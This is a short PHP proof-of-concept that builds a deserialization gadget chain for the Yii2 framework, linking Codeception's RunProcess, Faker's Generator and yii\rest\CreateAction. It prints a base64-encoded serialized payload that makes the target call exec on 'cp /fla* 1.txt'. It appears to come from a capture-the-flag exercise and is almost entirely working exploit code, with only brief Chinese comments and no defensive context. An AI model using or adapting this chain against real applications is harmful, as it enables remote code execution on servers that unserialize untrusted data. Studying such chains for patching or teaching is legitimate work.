<?php
namespace yii\rest{

    class CreateAction{

        public $checkAccess;
        public $id;

        public function __construct(){

            $this->checkAccess = "exec";
            $this->id = 'cp /fla* 1.txt';
        }
    }
}

namespace Faker{

    use yii\rest\CreateAction;

    class Generator{

        protected $formatters;

        public function __construct(){

            // 这里需要改为isRunning
            $this->formatters['isRunning'] = [new CreateAction(), 'run'];
        }
    }
}

// poc2
namespace Codeception\Extension{

    use Faker\Generator;
    class RunProcess{

        private $processes;
        public function __construct()
        {

            $this->processes = [new Generator()];
        }
    }
}
namespace{

    // 生成poc
    echo base64_encode(serialize(new Codeception\Extension\RunProcess()));
}
?>